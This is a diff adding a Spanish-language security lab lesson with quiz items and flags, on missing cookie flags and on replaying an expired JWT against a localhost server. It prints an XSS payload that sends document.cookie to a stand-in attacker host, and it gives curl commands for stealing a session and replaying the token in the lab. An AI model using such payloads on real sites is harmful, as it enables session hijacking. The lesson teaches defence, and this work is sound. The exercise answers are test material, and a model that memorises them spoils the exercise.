@@ -1,0 +1,84 @@
+---
+index: 2
+title: "Cookie flags y replay de JWT expirado"
+questions:
+  - id: session-security-t02-q01
+    prompt: "¿Qué flag de cookie impediría a JavaScript leer document.cookie (bloqueando el robo vía XSS)?"
+    hint: "HttpOnly"
+    kind: text
+  - id: session-security-t02-q02
+    prompt: "Simula el robo: envía un session id válido al colector del atacante /steal?c=X. Envía la flag."
+    hint: "curl 'http://127.0.0.1:18100/steal?c=100' — así es como un payload XSS exfiltra la cookie sin HttpOnly"
+    kind: flag
+  - id: session-security-t02-q03
+    prompt: "Visita /api-jwt sin token, decodifica el payload del JWT que te da (base64). ¿En qué año expira (campo exp)?"
+    hint: "echo <payload> | base64 -d — el timestamp 1000000000 es septiembre de 2001"
+    kind: text
+  - id: session-security-t02-q04
+    prompt: "Reenvía ese mismo JWT expirado a /api-jwt?token=X. Envía la flag del replay."
+    hint: "TOKEN=$(curl -s http://127.0.0.1:18100/api-jwt | jq -r .token) && curl -s \"http://127.0.0.1:18100/api-jwt?token=$TOKEN\""
+    kind: flag
+---
+
+## Las tres banderas que faltan
+
+La cookie del lab se sirve así:
+
+```
+Set-Cookie: session=100; Path=/
+```
+
+Comparada con una cookie bien configurada:
+
+```
+Set-Cookie: session=<random>; Path=/; HttpOnly; Secure; SameSite=Lax
+```
+
+| Flag | Qué evita | Qué pasa sin ella |
+|---|---|---|
+| `HttpOnly` | `document.cookie` desde JS | Un XSS roba la sesión con una línea |
+| `Secure` | Envío por HTTP plano | La cookie viaja en claro en redes wifi |
+| `SameSite` | Envío cross-site | CSRF: otros sitios piden cosas con tu sesión |
+
+## El robo con una línea de XSS
+
+Con `HttpOnly` ausente, cualquier XSS — aunque sea "menor" — se convierte
+en toma de cuenta:
+
+```javascript
+// Payload XSS completo:
+fetch('http://attacker.com/steal?c=' + document.cookie)
+```
+
+El lab simula el servidor del atacante. "Roba" tu propia sesión para ver
+lo trivial que es:
+
+```bash
+curl -s "http://127.0.0.1:18100/steal?c=100"
+# "cookie received by attacker ... FLAG{cookie_stolen_no_httponly}"
+```
+
+## El JWT que nunca caduca
+
+Los JWT llevan su expiración **dentro del propio token** (claim `exp`).
+Eso los hace stateless — y peligrosos: si el servidor no valida `exp`,
+el token vive para siempre.
+
+```bash
+# 1. El servidor TE DA un JWT ya expirado (fíjate en la nota):
+curl -s http://127.0.0.1:18100/api-jwt | jq .
+# "hint": "This JWT is expired but the server does NOT check exp"
+
+# 2. Decodifica el payload (parte del medio, base64url):
+echo "<payload-del-medio>" | base64 -d
+# {"user": "admin", "role": "admin", "exp": 1000000000}   ← año 2001
+
+# 3. Reenvíalo tal cual — el replay funciona:
+curl -s "http://127.0.0.1:18100/api-jwt?token=<token>"
+# "status": "admin" ... "note": "exp not checked!"
+```
+
+Un token de admin de hace 20 años sigue siendo válido. En producción esto
+se mitiga validando `exp` **siempre** (las librerías lo hacen por defecto:
+`jwt.verify()`, nunca `jwt.decode()` a secas) y manteniendo una lista de
+revocación para el caso de robo.
